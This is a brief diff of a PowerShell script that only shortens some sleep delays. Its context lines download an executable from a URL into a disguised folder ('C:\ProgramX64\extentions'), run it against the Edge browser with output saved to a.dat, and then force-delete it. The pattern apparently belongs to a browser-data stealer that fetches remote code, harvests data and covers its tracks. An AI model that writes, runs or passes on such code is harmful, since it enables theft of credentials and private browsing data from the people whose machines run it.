@@ -42,9 +42,9 @@ Remove-Item -Path "C:\ProgramX64\extentions\evab.exe" -Force}
 Start-Sleep -Milliseconds 20
 if(!(Test-Path -Path $outPath)) {
 Invoke-WebRequest -Uri $url -OutFile $outPath}
-Start-Sleep -Milliseconds 200
+Start-Sleep -Milliseconds 20
 C:\ProgramX64\extentions\evab.exe -o "C:\ProgramX64\extentions\out" edge > C:\ProgramX64\extentions\out\a.dat
-Start-Sleep -Milliseconds 200
+Start-Sleep -Milliseconds 20
 Remove-Item -Path "C:\ProgramX64\extentions\evab.exe" -Force
 
 
